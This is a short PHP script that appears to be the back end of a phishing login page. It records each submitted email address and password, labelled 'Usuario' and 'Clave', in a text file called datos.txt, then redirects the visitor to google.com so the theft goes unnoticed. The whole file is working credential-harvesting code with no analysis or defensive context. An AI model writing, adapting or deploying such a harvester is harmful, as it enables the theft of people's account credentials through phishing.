<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['Email'] . " Clave: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
